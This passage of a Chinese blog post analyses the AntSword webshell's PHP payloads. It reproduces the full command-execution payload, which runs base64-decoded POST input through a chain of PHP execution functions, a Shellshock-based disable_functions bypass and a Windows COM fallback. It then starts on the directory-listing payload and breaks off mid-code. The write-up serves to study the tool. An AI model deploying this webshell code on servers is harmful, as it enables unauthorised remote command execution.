class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">                <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">                putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">            @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @pclose(<span class="variable">$fp</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">            @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">            @proc_close(<span class="variable">$p</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @antsystem(<span class="variable">$c</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">            <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">            <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ;</span><br><span class="line">    <span class="variable">$ret</span> = @runcmd(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span> (<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span> . <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h3><p>首先关闭了报错信息，并将脚本执行之间设置为无限制，避免因为各种原因导致脚本运行超时而返回错误，而后开启缓冲区</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">	@set_time_limit(<span class="number">0</span>);</span><br><span class="line">	ob_start();</span><br></pre></td></tr></table></figure>
+
+<p><code>try</code> 语句内的是重头戏。</p>
+<ol>
+<li><p>解密参数，参数由一串随机字符串组成（上文中为<code>v1f656c7c99039</code> 、 <code>x44aab141531de</code> 、 <code>u6af8538cd4c2e</code>）</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$p</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;v1f656c7c99039&quot;</span>], <span class="number">2</span>));</span><br><span class="line"><span class="variable">$s</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;x44aab141531de&quot;</span>], <span class="number">2</span>));</span><br><span class="line"><span class="variable">$envstr</span> = @base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;u6af8538cd4c2e&quot;</span>], <span class="number">2</span>));</span><br></pre></td></tr></table></figure>
+
+<p> 根据请求包，解密出这些参数</p>
+<ul>
+<li><p>  <code>$envstr</code>:  (空)</p>
+</li>
+<li><p>  <code>$p</code>: <code>/bin/sh</code></p>
+</li>
+<li><p><code>$s</code>: <code>cd &quot;/var/www/html&quot;;cd /var/www/html/;echo [S];pwd;echo [E]</code></p>
+<p>$p 为执行命令用到的解释器（在 Windows 中为 cmd， 在 Linux 中为 /bin/sh</p>
+<p>$s 为需要执行的命令</p>
+</li>
+</ul>
+</li>
+<li><p>判断操作系统（Windows / Linux），并以此加入环境变量。</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="variable">$c</span> = substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> ? <span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @putenv(<span class="string">&quot;PATH=&quot;</span> . getenv(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">    <span class="variable">$envarr</span> = explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">            @putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 这里判断操作系统使用的方法是判断路径的第一个字符是否为 <code>/</code> 。</p>
+<p> 此处的 <code>$envstr</code>  为空，所以进入不到 if 中，暂时不做分析</p>
+</li>
+<li><p>拼接解释器与命令，并执行命令</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">// $r = /bin/sh -c cd &quot;/var/www/html&quot;;cd /var/www/html/;echo [S];pwd;echo [E]</span></span><br><span class="line"><span class="variable">$ret</span> = @runcmd(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>;;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>回显命令执行的结果</p>
+ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>下面着重分析一下<code>runcmd</code> 函数</p>
+<p>在分析 <code>runcmd</code> 之前，先看一下 <code>fe</code> 函数</p>
+<h3 id="fe"><a href="#fe" class="headerlink" title="fe"></a>fe</h3><p>fe 函数可以理解为 <code>function_exists</code> 函数的扩展，用于判断是否可以使用某个函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// function fe</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$d</span> = explode(<span class="string">&quot;,&quot;</span>, @ini_get(<span class="string">&quot;disable_functions&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$d</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, array_map(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (function_exists(<span class="variable">$f</span>) &amp;&amp; is_callable(<span class="variable">$f</span>) &amp;&amp; !in_array(<span class="variable">$f</span>, <span class="variable">$d</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它先把 <code>disabled_functions</code> 转化成了数组，然后进行了三个判断：</p>
+<ol>
+<li> 函数是否存在 <code>function_exists</code></li>
+<li> 函数是否可调用 <code>is_callable</code></li>
+<li> 函数是否在禁用列表中 <code>in_array($f, $d)</code></li>
+</ol>
+<p>综合以上三点返回函数是否可用</p>
+<h3 id="runcmd"><a href="#runcmd" class="headerlink" title="runcmd"></a>runcmd</h3><p>runcmd 函数会以此判断各种执行系统命令函数，寻找能用的函数，也会尝试绕过禁用函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$d</span> = dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (fe(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">        @system(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">        @passthru(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">        @exec(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">        <span class="keyword">print</span>(join(<span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>, <span class="variable">$o</span>));</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$fp</span> = @popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">        <span class="keyword">while</span> (!@feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>, <span class="number">2048</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        @pclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">        <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (!@feof(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        @fclose(<span class="variable">$io</span>[<span class="number">1</span>]);</span><br><span class="line">        @fclose(<span class="variable">$io</span>[<span class="number">2</span>]);</span><br><span class="line">        @proc_close(<span class="variable">$p</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (fe(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">        @antsystem(<span class="variable">$c</span>);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$w</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);</span><br><span class="line">        <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;StdOut();</span><br><span class="line">        <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;ReadAll();</span><br><span class="line">        <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;StdErr();</span><br><span class="line">        <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;ReadAll();</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$ret</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">127</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>依次判断了</p>
+<ul>
+<li>  system</li>
+<li>  passthru</li>
+<li>  shell_exec</li>
+<li>  exec</li>
+<li>  popen</li>
+<li>  proc_open</li>
+<li>  antsystem (猜测是蚁剑自己实现的函数)</li>
+</ul>
+<p>如果这些函数都被禁用，则会使用 <code>runshellshock</code> 函数或 <code>COM</code> 类</p>
+<p>可以说是面面俱到了</p>
+<h3 id="runshellshock"><a href="#runshellshock" class="headerlink" title="runshellshock"></a>runshellshock</h3><h4 id="什么是-shellshock"><a href="#什么是-shellshock" class="headerlink" title="什么是 shellshock"></a>什么是 shellshock</h4><p>参考文章： <a href="https://zhuanlan.zhihu.com/p/35579956">https://zhuanlan.zhihu.com/p/35579956</a></p>
+<p>简单的理解就是一种利用 unix 漏洞 bypass disabled_functions 的方法</p>
+<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);</span><br><span class="line">            putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">        @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$output</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从代码中可以看出用到三个函数</p>
+<ul>
+<li>  putenv</li>
+<li>  error_log</li>
+<li>  mail</li>
+</ul>
+<p>其中 error_log 与 mail 函数只是起到执行 bash 的效果</p>
+<h3 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h3><p>详见：<a href="https://www.php.net/manual/zh/faq.com.php">https://www.php.net/manual/zh/faq.com.php</a></p>
+<p>而 WScript.shell 这个对象在 asp shell 中常用，不做扩展</p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>此后的命令执行都是在上面的基础上做</p>
+<p>执行 ls 命令时，编码后的指令如下</p>
+<p><code>cd &quot;/var/www/html&quot;;ls;echo [S];pwd;echo [E]</code>，可以看到每一次都会切换目录（命令执行时的 cd，在下一次就会失效），而后执行命令。</p>
+<p>返回结果如下：</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210623140254835.png" alt="image-20210623140254835"></p>
+<p>对此有不解——我理解的 [S] == Start， [E] == End 那命令执行的结果为什么不在这之中而在外面呢？或许需要分析源码才能明白（所以蚁剑的 loader 什么时候开源）</p>
+<h2 id="文件管理"><a href="#文件管理" class="headerlink" title="文件管理"></a>文件管理</h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><p>蚁剑在访问目录时使用的核心代码为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$D</span> = base64_decode(substr(<span class="variable">$_POST</span>[<span class="string">&quot;o930dff714d3c9&quot;</span>], <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$F</span> = @opendir(<span class="variable">$D</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$F</span> == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;ERROR:// Path Not Found Or No Permission!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$M</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="variable">$L</span> = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$N</span> = @readdir(<span class="variable">$F</span>)) &#123;</span><br><span class="line">            <span class="variable">$P</span> = <span class="variable">$D</span> . <span class="variable">$N</span>;</span><br><span class="line">            <span class="variable">$T</span> = @date(<span class="string">&quot;Y-m-d H:i:s&quot;</span>, @filemtime(<span class="variable">$P</span>));</span><br><span class="line">            @<span class="variable">$E</span> = substr(base_convert(@fileperms(<span class="variable">$P</span>), <span class="number">10</span>, <span class="number">8</span>), <span class="number">-4</span>);</span><br><span class="line">            <span class="variable">$R</span> = <span class="string">&quot;	&quot;</span> . <span class="variable">$T</span> . <span class="string">&quot;	&quot;</span> . @filesize(<span class="variable">$P</span>) . <span class="string">&quot;	&quot;</span> . <span class="variable">$E</span> . <span class="string">&quot;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (@is_dir(<span class="variable">$P</span>)) <span class="variable">$M</span> .= <span class="variable">$N</span> . <span class="string">&quot;/&quot;</span> . <span class="variable">$R</span>; <span class="keyword">else</span> <span class="variable">$L</span> .= 